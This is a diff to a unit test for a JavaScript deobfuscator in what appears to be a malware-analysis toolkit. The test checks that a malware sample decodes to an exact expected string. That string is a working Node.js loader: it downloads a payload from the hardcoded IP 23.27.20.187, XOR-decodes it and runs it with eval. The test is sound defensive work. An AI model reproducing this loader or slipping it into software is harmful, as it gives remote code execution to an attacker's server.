@@ -121,8 +121,50 @@ class TestJsDeobfuscator(TestUnitBase):
     def test_multi_decoder_stage_sample(self):
         data = self.download_sample('2ab831e4650b36d399bf1e923ae1a2cb53ce93e5e9d2e5427103b750b0e6cf26')
         test = data | self.load() | str
-        self.assertIn('33ff3edaf55a8e03dcbc7cb40d498a49', test)
-        self.assertIn('http'':/''/23.27.20''.187', test)
+        self.assertEqual(test, inspect.cleandoc(
+            """
+            global.i = '1-172';
+            global.r = require;
+            global.m = module;
+            if (typeof __dirname !== 'undefined') {
+              global.___dirname = __dirname;
+            }
+            if (typeof __filename !== 'undefined') {
+              global.___filename = __filename;
+            }
+            (function() {
+              (async function() {
+                var _global = global;
+                var _V = _global.i || _global.o || '0';
+                var _require = _global.r;
+                _global._H = _global._U = '[[URL]]';
+                await eval(function(input) {
+                  var r = '';
+                  for (var i = 0; i < input.length; i++) {
+                    (function() {
+                      var c = input.charCodeAt(i);
+                      var x = 'YU7m{rE/>|==b>#~'.charCodeAt(i % 16);
+                      r += _global.String.fromCharCode(c ^ x);
+                    }).call(this);
+                  }
+                  return r;
+                }(await new _global.Promise(function(resolve, reject) {
+                  _require('http').get(_global._H + '/0/body', { headers: { 'X': '33ff3edaf55a8e03dcbc7cb40d498a49:' + _V } }, function(res) {
+                    var body = '';
+                    res.on('data', function(chunk) {
+                      body += chunk;
+                    });
+                    res.on('end', function() {
+                      resolve(body);
+                    });
+                  }).on('error', function(err) {
+                    reject(err);
+                  }).end();
+                })));
+              })();
+            })();
+            """.replace("[[URL]]", "http"":/""/23.27"".20"".187")
+        ))
 
 
 class TestJsHostEnvironmentPin(TestUnitBase):
